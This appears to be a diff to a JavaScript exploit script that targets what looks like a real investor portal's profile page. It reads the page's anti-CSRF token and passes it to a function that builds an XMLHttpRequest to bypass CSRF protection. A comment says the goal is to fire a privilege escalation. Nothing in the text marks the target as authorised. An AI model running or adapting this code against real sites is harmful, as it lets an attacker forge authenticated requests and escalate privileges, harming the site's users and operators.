@@ -6,13 +6,10 @@ console.log("Initiating exploit...");
 var priveEscTarget = "https://investorportal.ispt.net.au/my-profile"; //be sure to change this when making POST
 console.log("Targetting: " + priveEscTarget);
 
-function readToken() {
-  console.log("Reading response to extract anti-CSRF token...");
-  var extract = document.querySelector('input[name=_token]').value;
-  console.log("Token extracted successfully: " + extract);
-  console.log(" ");
-
-}
+console.log("Reading response to extract anti-CSRF token...");
+var extract = document.querySelector('input[name=_token]').value;
+console.log("Token extracted successfully: " + extract);
+console.log(" ");
 
 function bypassCSRF() {
   console.log("Instantiating XMLHttpRequest...");
@@ -33,7 +30,7 @@ function bypassCSRF() {
   console.log(" ");
 }
 
-readToken();
+//readToken();
 bypassCSRF();
 
 //console.log("Done! Verify extracted token value is correct, if so; write xhr function to fire the privesc");
